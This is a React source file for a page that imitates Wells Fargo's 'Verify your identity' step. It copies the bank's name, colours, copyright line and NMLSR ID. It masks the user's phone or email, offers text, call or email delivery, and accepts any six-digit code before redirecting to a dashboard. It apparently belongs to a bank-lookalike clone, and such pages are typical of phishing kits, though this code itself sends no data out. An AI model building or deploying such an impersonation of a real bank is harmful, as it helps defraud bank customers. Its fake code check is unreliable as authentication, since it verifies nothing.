import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { Search, Shield, Phone, MessageSquare, Mail, ChevronRight, Loader2 } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

export default function VerifyPage() {
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [codeSent, setCodeSent] = useState(false);
  const [code, setCode] = useState("");
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const { data: authData, isLoading, error } = useQuery({
    queryKey: ["/api/auth/me"],
  });

  useEffect(() => {
    if (error) {
      setLocation("/");
    }
  }, [error, setLocation]);

  const user = (authData as any)?.user;

  const verificationMethods = [
    {
      id: "text",
      icon: MessageSquare,
      title: "Text message",
      description: user?.phone ? `We'll text a code to ${user.phone.slice(0, 3)}***${user.phone.slice(-4)}` : "Add a phone number to use this option",
    },
    {
      id: "call",
      icon: Phone,
      title: "Phone call",
      description: user?.phone ? `We'll call you at ${user.phone.slice(0, 3)}***${user.phone.slice(-4)}` : "Add a phone number to use this option",
    },
    {
      id: "email",
      icon: Mail,
      title: "Email",
      description: user?.email ? `We'll email a code to ${user.email.slice(0, 2)}***@${user.email.split("@")[1]}` : "Add an email to use this option",
    },
  ];

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-8 h-8 animate-spin text-[#d71e28]" />
      </div>
    );
  }

  if (error || !authData) {
    return null;
  }

  const handleSendCode = () => {
    setCodeSent(true);
    toast({
      title: "Code Sent",
      description: "Please check your device for the verification code.",
    });
  };

  const handleVerify = () => {
    if (code.length === 6) {
      toast({
        title: "Verified Successfully",
        description: "Redirecting to your account...",
      });
      setLocation("/dashboard");
    } else {
      toast({
        title: "Invalid Code",
        description: "Please enter a valid 6-digit code.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Red header bar */}
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <Link href="/">
              <span
                className="text-lg font-bold tracking-wide cursor-pointer"
                data-testid="text-logo"
              >
                WELLS FARGO
              </span>
            </Link>

            <nav className="flex items-center gap-4 text-xs">
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-customer-service"
              >
                Customer Service
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-espanol"
              >
                Español
              </a>
              <div className="flex items-center gap-2">
                <Search className="w-4 h-4" />
              </div>
            </nav>
          </div>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-[#ffcd41] h-1"></div>

      {/* Main content */}
      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-lg mx-auto px-4 py-8">
          <Card
            className="shadow-lg border-0 bg-white"
            data-testid="card-verify"
          >
            <CardContent className="p-6 sm:p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-12 h-12 bg-[#d71e28]/10 rounded-full flex items-center justify-center">
                  <Shield className="w-6 h-6 text-[#d71e28]" />
                </div>
                <div>
                  <h1
                    className="text-xl text-gray-800 font-semibold"
                    data-testid="text-title"
                  >
                    Verify your identity
                  </h1>
                  <p className="text-sm text-gray-500">
                    For your security, we need to verify it's you
                  </p>
                </div>
              </div>

              {!codeSent ? (
                <>
                  <p className="text-gray-600 text-sm mb-4">
                    Choose how you'd like to receive your verification code:
                  </p>

                  <div className="space-y-3 mb-6">
                    {verificationMethods.map((method) => (
                      <button
                        key={method.id}
                        onClick={() => setSelectedMethod(method.id)}
                        className={`w-full p-4 border rounded-md text-left transition-colors ${
                          selectedMethod === method.id
                            ? "border-[#d71e28] bg-red-50"
                            : "border-gray-300 hover:border-gray-400"
                        }`}
                        data-testid={`button-method-${method.id}`}
                      >
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-10 h-10 rounded-full flex items-center justify-center ${
                              selectedMethod === method.id
                                ? "bg-[#d71e28] text-white"
                                : "bg-gray-100 text-gray-600"
                            }`}
                          >
                            <method.icon className="w-5 h-5" />
                          </div>
                          <div className="flex-1">
                            <p className="font-medium text-gray-800">
                              {method.title}
                            </p>
                            <p className="text-sm text-gray-500">
                              {method.description}
                            </p>
                          </div>
                          <ChevronRight
                            className={`w-5 h-5 ${
                              selectedMethod === method.id
                                ? "text-[#d71e28]"
                                : "text-gray-400"
                            }`}
                          />
                        </div>
                      </button>
                    ))}
                  </div>

                  <Button
                    onClick={handleSendCode}
                    disabled={!selectedMethod}
                    className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full disabled:bg-gray-200 disabled:text-gray-500"
                    data-testid="button-send-code"
                  >
                    Send code
                  </Button>
                </>
              ) : (
                <>
                  <p className="text-gray-600 text-sm mb-4">
                    Enter the 6-digit code we sent to your{" "}
                    {selectedMethod === "email" ? "email" : "phone"}:
                  </p>

                  <div className="mb-6">
                    <input
                      type="text"
                      maxLength={6}
                      value={code}
                      onChange={(e) =>
                        setCode(e.target.value.replace(/\D/g, ""))
                      }
                      placeholder="000000"
                      className="w-full h-14 text-center text-2xl tracking-[0.5em] border border-gray-300 rounded-md focus:border-[#d71e28] focus:ring-1 focus:ring-[#d71e28] outline-none"
                      data-testid="input-code"
                    />
                  </div>

                  <Button
                    onClick={handleVerify}
                    className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full mb-4"
                    data-testid="button-verify"
                  >
                    Verify
                  </Button>

                  <button
                    onClick={handleSendCode}
                    className="w-full text-center text-[#d71e28] text-sm hover:underline"
                    data-testid="button-resend"
                  >
                    Didn't receive a code? Send again
                  </button>
                </>
              )}

              <div className="mt-6 pt-6 border-t border-gray-200">
                <p className="text-xs text-gray-500 text-center">
                  Having trouble?{" "}
                  <a href="#" className="text-[#d71e28] hover:underline">
                    Contact us
                  </a>{" "}
                  for help with verification.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4">
          <p
            className="text-xs text-gray-500 text-center"
            data-testid="text-copyright"
          >
            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
          </p>
        </div>
      </footer>
    </div>
  );
}
